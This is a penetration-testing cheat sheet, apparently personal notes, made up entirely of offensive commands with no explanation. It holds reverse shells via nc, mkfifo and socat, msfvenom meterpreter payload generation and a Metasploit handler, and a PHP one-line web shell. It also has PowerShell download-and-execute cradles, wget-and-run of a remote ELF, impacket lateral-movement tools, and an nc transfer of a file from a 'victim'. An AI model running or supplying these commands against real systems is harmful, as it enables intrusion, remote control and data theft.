## random
```
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

socat file:`tty`,raw,echo=0 tcp-listen:80
socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.1.1:80

x=`ifconfig | grep 'inet ' | grep 10 | cut -d ' ' -f 10` ; echo $x
msfp  linux/x86/meterpreter/reverse_tcp $x 8534  elf 
msfp  linux/x64/meterpreter_reverse_tcp $x 8564  elf 
msfp  php/meterpreter_reverse_tcp $x 443  raw 
msfp  php/reverse_php $x 1243 raw 
msfp  java/meterpreter/reverse_tcp $x 4442  war 
msfp  windows/meterpreter/reverse_tcp $x 1236  asp 
msfp  windows/meterpreter/reverse_tcp $x 1236  aspx 
msfp  windows/meterpreter/reverse_tcp $x 4436  exe 

python /usr/share/doc/python-impacket/examples/smbserver.py share `pwd`
<?php system($_GET['cmd']); ?>

cd /tmp;wget 10.1.1.1/1287.elf;chmod 777 /tmp/*;cd /tmp;setsid ./1287.elf

use multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lhost 10.10.1.1
set lport  1264
exploit -j

python /opt/impacket/examples/wmiexec.py 
python /opt/impacket/examples/psexec.py 
python /opt/impacket/examples/smbclient.py

nc 10.10.1.1 5555 < backup.zip                on victim send backup.zip
nc -lvp 5555 > /root/backup.zip                on kali receive backup.zip

python /usr/share/doc/python-impacket/examples/smbserver.py share `pwd`
powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.1.1/s.ps1')
powershell  -ExecutionPolicy Bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.1.1/s1.ps1')

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.1.1/r1.exe', 'r1.exe')"
powershell -c "iwr -uri 10.10.1.1/nc64.exe -OutFile C:\Users\public\downloads\nc.exe"
powershell -c wget 10.10.1.1/nc64.exe -OutFile C:\Users\Chase\downloads\nc.exe

powershell -c "wget http://10.10.1.1/nc64.exe -OutFile C:\Users\public\downloads\nc64.exe"

<?php  system($_GET['cmd']);  ?>

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=8534 -f elf > 8534.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.1.1.1 LPORT=8564 -f elf > 8564.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.1.1.1 LPORT=4263 -f raw > 4263.php
msfvenom -p php/reverse_php LHOST=10.1.1.1 LPORT=1243 -f raw > 1243.php
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=4442 -f war > 4442.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=1236 -f asp > 1236.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=1236 -f aspx > 1236.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.1 LPORT=4436 -f exe > 4436.exe
```

